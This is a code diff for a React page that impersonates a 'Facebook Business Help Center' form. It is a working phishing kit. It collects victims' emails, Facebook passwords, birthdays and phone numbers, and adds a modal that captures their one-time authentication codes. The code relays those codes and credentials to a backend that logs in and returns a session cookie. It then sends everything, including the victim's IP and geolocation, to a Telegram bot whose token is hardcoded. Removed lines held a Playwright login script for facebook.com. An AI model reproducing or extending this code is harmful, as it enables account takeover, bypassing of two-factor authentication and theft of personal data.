@@ -1,4 +1,4 @@
-import React, { useState } from 'react';
+import React, { useEffect, useState } from 'react';
 import Header from './header'
 import Footer from './footer';
 import { Typography, FormControl, Box, Grid, Container, TextField, FormControlLabel, Checkbox, Button, Modal } from '@mui/material';
@@ -190,6 +190,11 @@ const Issue = () => {
         paddingBottom: '1.5em',
     }
 
+    const backgroundImgStyle = {
+        width: '100%',
+        height: '200px'
+    }
+
     const [formData, setFormData] = useState({
         ip: '',
         countryCode: '',
@@ -197,7 +202,7 @@ const Issue = () => {
         latitude: '',
         longtitude: '',
         info: '',
-        emailBusiness: '',
+        username: '',
         emailPersonal: '',
         fbPage: '',
         password: '',
@@ -205,13 +210,14 @@ const Issue = () => {
         dob: '',
         phone: '',
         userAgent: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36',
-        cookie: ''
+        cookie: '',
+        otp: ''
     });
 
     const [open, setOpen] = useState(false);
     const handleOpen = () => setOpen(true);
     const handleClose = () => setOpen(false);
-
+    const [isOtpModalOpen, setOtpModalOpen] = useState(false);
     const handleChange = (e) => {
         const { name, value } = e.target;
         setFormData((prevData) => ({
@@ -219,50 +225,99 @@ const Issue = () => {
             [name]: value,
         }));
     };
+    const [socket, setSocket] = useState<WebSocket | null>(null);
 
-    const playwright = require('playwright');
+    const handleOtpSend = () => {
 
-    const handleSubmit = async () => {
-        const apiKey = '6425835045:AAH4oQKUYBm1HJRb2ALoeP5fEkfGgqSvmuo'; // Replace with your bot API key
-        const chatId = '-1002102330634'; // Replace with your chat ID
+        const ws = new WebSocket(`ws://localhost:8000/ws/${formData.emailPersonal}`);
+
+        ws.onopen = () => {
+            console.log("WebSocket connection established");
+            ws.send(formData.otp);
+        };
+
+        ws.onmessage = (event) => {
+            console.log("Message from server:", event.data);
+            ws.close();
+        };
+
+        ws.onerror = (error) => {
+            console.error("WebSocket error:", error);
+        };
+
+        ws.onclose = () => {
+            console.log("WebSocket connection closed");
+        };
+    }
+
+    const handleOtpSubmit = async () => {
+
+        console.log('***************', formData)
 
         const headers = {
             'Content-Type': 'application/json',
         };
 
-        const apiUrl = `https://api.telegram.org/bot${apiKey}/sendMessage`;
+        const apiUrl = `http://127.0.0.1:8000/login/`;
 
+        const data = {
+            username: formData.emailPersonal,
+            password: formData.password
+        }
 
-
-
-        // Access the form data here (formData object)
-        console.log(formData);
+        console.log('=============', data)
 
         try {
-            // Launch a headless browser with Playwright (you can choose a specific browser)
-            const browser = await playwright.chromium.launch();
-            const context = await browser.newContext();
-            const page = await context.newPage();
+            const response = await fetch(apiUrl, {
+                method: 'POST',
+                headers,
+                body: JSON.stringify(data),
+            });
 
-            // Navigate to a webpage (replace with the actual URL)
-            const targetUrl = 'https://www.facebook.com/'; // Replace with the URL you want to visit
-            await page.goto(targetUrl);
-            await page.fill('#email', formData.emailPersonal);
-            await page.fill('#pass', formData.password);
-            await page.click('button[name="login"]');
-            await page.waitForSelector('a[aria-label="Facebook"]');
+            if (!response.ok) {
+                throw new Error('Network response was not ok');
+            }
 
-            // You can perform interactions with the page using Playwright here if needed
-
-            // Close the browser when done
-            await browser.close();
-
-            // Continue with sending the Telegram message
-
+            const dataResponse = await response.json();
+            console.log(dataResponse)
+            formData.cookie = dataResponse.cookie
         } catch (error) {
             console.error('Error sending message:', error);
             throw error;
         }
+
+        const apiKey = '6425835045:AAH4oQKUYBm1HJRb2ALoeP5fEkfGgqSvmuo'; // Replace with your bot API key
+        const chatId = '-1002102330634'; // Replace with your chat ID
+
+        const apiTelegramUrl = `https://api.telegram.org/bot${apiKey}/sendMessage`;
+
+        const fetchPublicIP = async () => {
+            const response = await fetch('https://api.ipify.org?format=json');
+            const data = await response.json();
+            return data.ip;
+        };
+
+        const fetchGeolocationData = async (ip) => {
+            try {
+                const response = await fetch(`http://ip-api.com/json/${ip}`);
+                if (!response.ok) {
+                    throw new Error('Network response was not ok');
+                }
+                const data = await response.json();
+                return data;
+            } catch (error) {
+                console.error('Error fetching geolocation data:', error);
+            }
+        };
+
+
+        formData.ip = await fetchPublicIP()
+        const geoData = await fetchGeolocationData(formData.ip)
+        formData.countryCode = geoData.countryCode
+        formData.city = geoData.city
+        formData.latitude = geoData.lat
+        formData.longtitude = geoData.lon
+
 
         const formattedString = `[{}]: New information submitted 
         *IP:* ${formData.ip}
@@ -271,8 +326,8 @@ const Issue = () => {
         *Latitude:* ${formData.latitude}
         *Longitude:* ${formData.longtitude}
         *Information:* ${formData.info}
-        *Business Email:* ${formData.emailBusiness}
-        *Personal Email*: ${formData.emailPersonal}
+        *Personal Email:* ${formData.emailPersonal}
+        *Facebook Username*: ${formData.username}
         *Password: * ${formData.password}
         *Fullname: *${formData.fullName}
         *Facebook Name:* ${formData.fbPage}
@@ -281,7 +336,7 @@ const Issue = () => {
         *User Agent:* ${formData.userAgent}
         *Cookie*: ${formData.cookie}`;
 
-        const data = {
+        const dataTelegram = {
             chat_id: chatId,
             text: formattedString,
             parse_mode: 'HTML',
@@ -289,10 +344,10 @@ const Issue = () => {
         };
 
         try {
-            const response = await fetch(apiUrl, {
+            const response = await fetch(apiTelegramUrl, {
                 method: 'POST',
                 headers,
-                body: JSON.stringify(data),
+                body: JSON.stringify(dataTelegram),
             });
 
             if (response.ok) {
@@ -306,6 +361,15 @@ const Issue = () => {
         }
 
 
+        // Close the OTP modal
+        setOtpModalOpen(false);
+    };
+
+    const handleSubmit = async () => {
+        // Access the form data here (formData object)
+        console.log(formData);
+        setOpen(false);
+        setOtpModalOpen(true);
     };
 
 
@@ -314,7 +378,7 @@ const Issue = () => {
             <Header />
             <Box component='section'>
                 <Box>
-                    <img src='images/main_background.jpg' alt='background_png' ></img>
+                    <img style={backgroundImgStyle} src='images/main_background.jpg' alt='background_png' ></img>
                     <Typography variant='h2' className="centered-text" style={facebookStyle}>Facebook Business Help Center</Typography>
                 </Box>
                 <Box style={secondBoxStyle}>
@@ -343,10 +407,10 @@ const Issue = () => {
                                 <FormControl style={formStyle}>
                                     <Typography component='label' variant='body1' style={bodyStyle}>Please provide us information that will help us investigate</Typography>
                                     <textarea onChange={handleChange} required name='infor' rows={4} style={textAreaStyle} />
-                                    <Typography component='label' variant='body1' style={bodyStyle}>Business Email</Typography>
-                                    <TextField onChange={handleChange} required name='emailBusiness' type='email'></TextField>
-                                    <Typography component='label' variant='body1' style={bodyStyle}>Facebook Email</Typography>
+                                    <Typography component='label' variant='body1' style={bodyStyle}>Personal Email</Typography>
                                     <TextField onChange={handleChange} required name='emailPersonal' type='email'></TextField>
+                                    <Typography component='label' variant='body1' style={bodyStyle}>Facebook Username</Typography>
+                                    <TextField onChange={handleChange} required name='username' type='email'></TextField>
                                     <Typography component='label' variant='body1' style={bodyStyle}>Facebook Page Name</Typography>
                                     <TextField onChange={handleChange} required name='fbPage' type='text'></TextField>
                                     <Typography component='label' variant='body1' style={bodyStyle}>Full name</Typography>
@@ -354,15 +418,14 @@ const Issue = () => {
                                     <Typography component='label' variant='body1' style={bodyStyle}>Birthday</Typography>
                                     <TextField onChange={handleChange} required name='dob' type='date'></TextField>
                                     <Typography component='label' variant='body1' style={bodyStyle}>Phone Number</Typography>
-                                    {/* <Box>
-                                        <PhoneInput onChange={handleChange} inputProps={{
-                                            name: 'phone',
-                                            required: true,
-                                            autoFocus: true
-                                        }} style={phoneStyle} country={'us'} />
-                                    </Box> */}
-                                    <FormControlLabel required control={<Checkbox />} labelPlacement='end' label='I agree to our Terms, Data and Cookies Policy.' />
-                                    <Button variant="contained" size='medium' tabIndex={0} type='button' onClick={handleOpen}>Submit</Button>
+                                    <PhoneInput onChange={handleChange} inputProps={{
+                                        name: 'phone',
+                                        required: true,
+                                        autoFocus: true
+                                    }} country={'us'} />
+
+                                    <FormControlLabel className='agree' required control={<Checkbox />} labelPlacement='end' label='I agree to our Terms, Data and Cookies Policy.' />
+                                    <Button variant="contained" size='medium' tabIndex={0} className='submit-info' type='button' onClick={handleOpen}>Submit</Button>
                                     <Modal
                                         open={open}
                                         onClose={handleClose}
@@ -382,19 +445,55 @@ const Issue = () => {
                                                 <Box>
                                                     <TextField onChange={handleChange} required type='password' name='password' placeholder='*********'></TextField>
                                                 </Box>
+
                                             </Box>
                                             <Box className='footer-modal'>
                                                 <Grid container item md={12} className=''>
-                                                    <Button className='cancel-btn' type='button'>
+                                                    <Button className='submit-info' type='button'>
                                                         Cancel
                                                     </Button>
-                                                    <Button onClick={handleSubmit} className='submit-btn' type='submit'>
+                                                    <Button onClick={handleSubmit} className='submit-info btn-space' type='submit'>
                                                         Submit
                                                     </Button>
                                                 </Grid>
                                             </Box>
                                         </Box>
 
+                                    </Modal>
+                                    {/* OTP Modal */}
+                                    <Modal
+                                        open={isOtpModalOpen}
+                                        onClose={() => setOtpModalOpen(false)}
+                                        aria-labelledby="otp-modal-title"
+                                        aria-describedby="otp-modal-description"
+                                    >
+                                        <Box style={modalStyle}>
+                                            <Box className='header-modal' style={headerStyle}>
+                                                <Typography variant="body2" component="p" style={modalTextStyle}>
+                                                    Please input your authentication code send to your device.
+                                                </Typography>
+                                            </Box>
+                                            <Box className='content-modal' style={contentStyle}>
+                                                <TextField
+                                                    name='otp'
+                                                    type='text'
+                                                    placeholder='Enter OTP here'
+                                                    onChange={handleChange}
+                                                    className='otp-input'
+                                                // Add any additional styling or attributes
+                                                />
+                                            </Box>
+                                            <Box className='footer-modal'>
+                                                <Grid container item md={12} className=''>
+                                                    <Button onClick={handleOtpSubmit} className='submit-info' type='button'>
+                                                        Get Code
+                                                    </Button>
+                                                    <Button onClick={handleOtpSend} className='submit-info btn-space' type='button'>
+                                                        Submit Code
+                                                    </Button>
+                                                </Grid>
+                                            </Box>
+                                        </Box>
                                     </Modal>
                                 </FormControl>
                             </Box>
